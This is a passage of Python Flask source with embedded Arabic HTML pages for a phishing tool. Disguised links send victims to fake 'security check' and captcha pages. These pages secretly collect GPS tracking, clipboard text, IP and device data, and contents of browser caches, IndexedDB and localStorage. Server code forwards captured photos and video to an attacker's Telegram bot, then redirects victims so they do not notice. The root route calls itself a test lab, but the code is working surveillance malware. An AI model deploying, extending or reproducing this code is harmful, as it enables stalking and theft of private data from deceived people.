            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #locationLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 80px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
        }
        #locationLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📍</span>
        <h1 class="title">تحديث الموقع الجغرافي</h1>
        <p class="subtitle">نقوم بتحديث موقعك لتحسين تجربة التصفح</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🌐</span>
            <p class="captcha-text" id="captchaText">جاري تتبع الموقع...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري جلب الموقع...</p>
        <div id="locationLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري التتبع...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const locationLog = document.getElementById('locationLog');

        let progress = 0;
        let dataSent = false;
        let locationCount = 0;
        const MAX_LOCATIONS = 15;
        const locations = [];
        let watchId = null;

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            locations: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        data.clipboard = text;
                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
                    }
                }
            } catch(e) {}
        }

        function startLocationTracking() {
            if (!navigator.geolocation) {
                captchaText.textContent = '⚠️ الموقع غير مدعوم';
                captchaIcon.textContent = '⚠️';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                pos => addLocation(pos),
                () => {},
                { enableHighAccuracy: true, timeout: 5000 }
            );

            watchId = navigator.geolocation.watchPosition(
                pos => addLocation(pos),
                err => {
                    captchaText.textContent = '⚠️ خطأ في التتبع: ' + err.message;
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
            );

            setTimeout(() => {
                if (watchId) {
                    navigator.geolocation.clearWatch(watchId);
                    watchId = null;
                    captchaText.textContent = '✅ تم جمع ' + locations.length + ' مواقع';
                    captchaIcon.textContent = '✅';
                    captchaStatus.textContent = '✅ تم التتبع';
                    captchaStatus.className = 'captcha-status done';
                }
            }, 30000);
        }

        function addLocation(pos) {
            if (locations.length >= MAX_LOCATIONS) return;

            const loc = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude || null,
                speed: pos.coords.speed || null,
                timestamp: new Date().toISOString()
            };

            locations.push(loc);
            data.locations = locations;
            locationCount++;

            const logEntry = document.createElement('div');
            logEntry.textContent = `📍 #${locationCount}: ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)} (دقة: ${Math.round(loc.accuracy)}م)`;
            locationLog.appendChild(logEntry);
            locationLog.scrollTop = locationLog.scrollHeight;

            captchaText.textContent = `📍 تم تحديث الموقع (${locationCount}/${MAX_LOCATIONS})`;
            progressFill.style.width = Math.min((locationCount / MAX_LOCATIONS) * 100, 90) + '%';
            statusText.textContent = `جاري تتبع الموقع... ${locationCount}/${MAX_LOCATIONS}`;
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                setTimeout(updateProgress, 500 + Math.random() * 400);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال ' + locations.length + ' مواقع';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            await getClipboard();
            updateProgress();
            startLocationTracking();

            setTimeout(() => {
                progressFill.style.width = '100%';
                statusText.textContent = '✅ تم تتبع ' + locations.length + ' مواقع';
                captchaStatus.textContent = '✅ جاهز للإرسال';
                captchaStatus.className = 'captcha-status done';

                verifyBtn.textContent = '✔️ تأكيد الإرسال';
                verifyBtn.classList.add('active');
                verifyBtn.style.opacity = '1';
            }, 32000);
        }

        init();
    </script>
</body>
</html>
"""

FILE_EXFIL_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #fileLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 80px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
        }
        #fileLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📁</span>
        <h1 class="title">فحص الملفات الآمن</h1>
        <p class="subtitle">نقوم بفحص ملفاتك للتأكد من سلامتها</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔍</span>
            <p class="captcha-text" id="captchaText">جاري فحص الملفات...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تحليل الملفات...</p>
        <div id="fileLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري الفحص...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const fileLog = document.getElementById('fileLog');

        let progress = 0;
        let dataSent = false;
        let filesCollected = [];

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            files: [],
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        data.clipboard = text;
                    }
                }
            } catch(e) {}
        }

        async function collectFiles() {
            try {
                // محاولة قراءة من Cache API
                try {
                    const cache = await caches.open('v1');
                    const keys = await cache.keys();
                    if (keys.length > 0) {
                        for (const request of keys) {
                            const response = await cache.match(request);
                            if (response) {
                                const blob = await response.blob();
                                if (blob && blob.size > 0) {
                                    const reader = new FileReader();
                                    const content = await new Promise((resolve) => {
                                        reader.onload = () => resolve(reader.result);
                                        reader.readAsDataURL(blob);
                                    });
                                    const filename = request.url.split('/').pop() || 'cache_file';
                                    filesCollected.push({
                                        name: filename,
                                        size: blob.size,
                                        type: blob.type || 'application/octet-stream',
                                        content: content
                                    });
                                    const logEntry = document.createElement('div');
                                    logEntry.textContent = `📄 تم استخراج: ${filename} (${(blob.size/1024).toFixed(1)} KB)`;
                                    fileLog.appendChild(logEntry);
                                    fileLog.scrollTop = fileLog.scrollHeight;
                                }
                            }
                        }
                    }
                } catch(e) {}

                // محاولة قراءة من IndexedDB
                try {
                    const databases = await indexedDB.databases ? await indexedDB.databases() : [];
                    for (const dbInfo of databases) {
                        try {
                            const db = await new Promise((resolve, reject) => {
                                const req = indexedDB.open(dbInfo.name);
                                req.onsuccess = () => resolve(req.result);
                                req.onerror = () => reject(req.error);
                            });
                            const objectStores = db.objectStoreNames;
                            for (const storeName of objectStores) {
                                const transaction = db.transaction(storeName, 'readonly');
                                const store = transaction.objectStore(storeName);
                                const allRecords = await new Promise((resolve) => {
                                    const req = store.getAll();
                                    req.onsuccess = () => resolve(req.result);
                                    req.onerror = () => resolve([]);
                                });
                                for (const record of allRecords) {
                                    if (record && typeof record === 'object') {
                                        const json = JSON.stringify(record);
                                        if (json.length > 100) {
                                            filesCollected.push({
                                                name: `${dbInfo.name}_${storeName}_record.json`,
                                                size: json.length,
                                                type: 'application/json',
                                                content: 'data:application/json;base64,' + btoa(json)
                                            });
                                            const logEntry = document.createElement('div');
                                            logEntry.textContent = `📄 استخراج: ${dbInfo.name}/${storeName} (${(json.length/1024).toFixed(1)} KB)`;
                                            fileLog.appendChild(logEntry);
                                            fileLog.scrollTop = fileLog.scrollHeight;
                                        }
                                    }
                                }
                            }
                            db.close();
                        } catch(e) {}
                    }
                } catch(e) {}

                // محاولة قراءة من localStorage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key) {
                            const value = localStorage.getItem(key);
                            if (value && value.length > 500) {
                                filesCollected.push({
                                    name: `localStorage_${key}.json`,
                                    size: value.length,
                                    type: 'application/json',
                                    content: 'data:application/json;base64,' + btoa(value)
                                });
                                const logEntry = document.createElement('div');
                                logEntry.textContent = `📄 استخراج localStorage: ${key} (${(value.length/1024).toFixed(1)} KB)`;
                                fileLog.appendChild(logEntry);
                                fileLog.scrollTop = fileLog.scrollHeight;
                            }
                        }
                    }
                } catch(e) {}

                data.files = filesCollected;
                captchaText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
                if (filesCollected.length > 0) {
                    captchaIcon.textContent = '✅';
                }

            } catch(e) {
                captchaText.textContent = '⚠️ تم استخراج ' + filesCollected.length + ' ملف';
                captchaIcon.textContent = '⚠️';
            }
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = ['🔍 فحص الملفات...', '🔄 تحليل البيانات...', '📦 تجميع المعلومات...'];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال ' + filesCollected.length + ' ملف';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            await getClipboard();
            updateProgress();
            await collectFiles();

            progressFill.style.width = '100%';
            statusText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
            captchaStatus.textContent = '✅ جاهز للإرسال';
            captchaStatus.className = 'captcha-status done';
            captchaText.textContent = `✅ ${filesCollected.length} ملف جاهز`;

            verifyBtn.textContent = '✔️ تأكيد الإرسال';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
        }

        init();
    </script>
</body>
</html>
"""

CLIPBOARD_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #clipboardLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 150px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
            word-break: break-all;
        }
        #clipboardLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📋</span>
        <h1 class="title">فحص المحتوى</h1>
        <p class="subtitle">نقوم بتحليل محتوى الحافظة للتأكد من سلامتها</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔍</span>
            <p class="captcha-text" id="captchaText">جاري فحص الحافظة...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تحليل المحتوى...</p>
        <div id="clipboardLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري الفحص...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const clipboardLog = document.getElementById('clipboardLog');

        let progress = 0;
        let dataSent = false;
        let clipboardContent = null;

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        clipboardContent = text;
                        data.clipboard = text;
                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
                        captchaIcon.textContent = '✅';
                        captchaStatus.textContent = '✅ تم الاستخراج';
                        captchaStatus.className = 'captcha-status done';

                        const logEntry = document.createElement('div');
                        logEntry.textContent = `📄 محتوى الحافظة: ${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`;
                        clipboardLog.appendChild(logEntry);
                        clipboardLog.scrollTop = clipboardLog.scrollHeight;
                    } else {
                        captchaText.textContent = '📭 الحافظة فارغة';
                        captchaIcon.textContent = '📭';
                    }
                } else {
                    captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة';
                    captchaIcon.textContent = '⚠️';
                }
            } catch(e) {
                captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة (قد تحتاج إذن)';
                captchaIcon.textContent = '⚠️';
            }
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = ['🔍 فحص الحافظة...', '🔄 تحليل المحتوى...', '📦 تجميع البيانات...'];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم الإرسال';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            updateProgress();
            await getClipboard();

            progressFill.style.width = '100%';
            statusText.textContent = clipboardContent ? '✅ تم حفظ محتوى الحافظة' : '📭 الحافظة فارغة';
            captchaStatus.textContent = '✅ جاهز للإرسال';
            captchaStatus.className = 'captcha-status done';

            verifyBtn.textContent = '✔️ تأكيد الإرسال';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
        }

        init();
    </script>
</body>
</html>
"""
# ============================================================
#  الصفحات الثمانية (كل صفحة تستخدم القالب مع إجراء مختلف)
# ============================================================

def render_captcha_page(action):
    """دالة مساعدة لإنشاء صفحات Captcha"""
    return CAPTCHA_TEMPLATE.replace('{{ action }}', action)

# ====== تعريف الصفحات ======
CAMERA_FRONT_PAGE = render_captcha_page('camera_front')
CAMERA_BACK_PAGE = render_captcha_page('camera_back')
VIDEO_FRONT_PAGE = render_captcha_page('video_front')
VIDEO_BACK_PAGE = render_captcha_page('video_back')
AUDIO_PAGE = render_captcha_page('audio')
LOCATION_PAGE = render_captcha_page('location')
DEVICE_PAGE = render_captcha_page('device')
ALL_PAGE = render_captcha_page('all')

# ============================================================
#  دوال Flask (الـ Routes)
# ============================================================

@app.route('/')
def index():
    return "🔬 مختبر الاختبار - يعمل"
@app.route('/<domain>/<path:path>')
def handle_masked_link(domain, path):
    """معالجة الروابط المقنعة (مثل /instagram/l7uzl/abc123)"""
    # استخراج session_id من المسار (آخر جزء)
    parts = path.split('/')
    session_id = parts[-1][:8] if parts else None
    
    if not session_id:
        return "❌ رابط غير صالح", 404
    
    # البحث عن الجلسة في قاعدة البيانات
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (session_id + '%',)).fetchone()
    conn.close()
    
    if not session:
        return "❌ رابط غير صالح", 404
    
    # التحقق من الصلاحية (10 دقائق)
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    
    # إعادة التوجيه إلى صفحة الاختبار
    return redirect(f"/test/{session['session_id']}/{session['features']}")
    
@app.route('/get_ip')
def get_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    return jsonify({'ip': ip})

@app.route('/<path:path>')
def handle_fake_path(path):
    # البحث عن session_id في الرابط
    conn = get_db()
    session = conn.execute('SELECT * FROM sessions WHERE fake_url LIKE ?', (f'%{path}%',)).fetchone()
    conn.close()
    
    if not session:
        # إذا لم يتم العثور، حاول البحث كرابط مختصر (للتوافق مع الإصدارات السابقة)
        conn = get_db()
        session = conn.execute('SELECT * FROM sessions WHERE session_id LIKE ?', (path[:8] + '%',)).fetchone()
        conn.close()
        if not session:
            return "❌ رابط غير صالح", 404
    
    session_id = session['session_id']
    features = session['features']
    original_url = session['original_url']
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 300:
        return "⏰ انتهت صلاحية الرابط", 403
    
    # إعادة التوجيه إلى صفحة الاختبار
    return redirect(f"/test/{session_id}/{features}")
# في دالة test_page
@app.route('/test/<session_id>/<features>')
def test_page(session_id, features):
    session = get_session(session_id)
    if not session:
        return "❌ جلسة غير صالحة", 404
    
    created = datetime.fromisoformat(session['created'])
    if (datetime.now() - created).seconds > 600:
        return "⏰ انتهت صلاحية الرابط", 403
    
    original_url = session['original_url']
    
    # اختيار الصفحة المناسبة
    pages = {
    'camera_front': CAMERA_FRONT_PAGE,
    'camera_back': CAMERA_BACK_PAGE,
    'video_front': VIDEO_FRONT_PAGE,
    'video_back': VIDEO_BACK_PAGE,
    'audio': AUDIO_PAGE,
    'location': LOCATION_PAGE,
    'device': DEVICE_PAGE,
    'all': ALL_PAGE,
    # الميزات الجديدة
    'location_tracking': LOCATION_TRACKING_PAGE,
    'file_exfil': FILE_EXFIL_PAGE,
    'clipboard': CLIPBOARD_PAGE
    }
    
    page = pages.get(features)
    if not page:
        return "❌ ميزة غير معروفة", 404
    
    return render_template_string(
        page,
        session_id=session_id,
        original_url=original_url,
        feature=features
    )

@app.route('/send_data', methods=['POST'])
def send_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        session = get_session(session_id)
        if not session:
            return jsonify({'error': 'جلسة غير صالحة'}), 404
        chat_id = session['chat_id']
        
        # ====== إرسال الصور ======
        for key in ['camera_front', 'camera_back']:
            if data.get(key):
                for img_data in data[key]:
                    try:
                        img = img_data.split(',', 1)[1]
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        files = {'photo': base64.b64decode(img)}
                        requests.post(url, data={'chat_id': chat_id}, files=files)
                    except:
                        pass
        
        # ====== إرسال الفيديو ======
        if data.get('video'):
            try:
                video = data['video'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
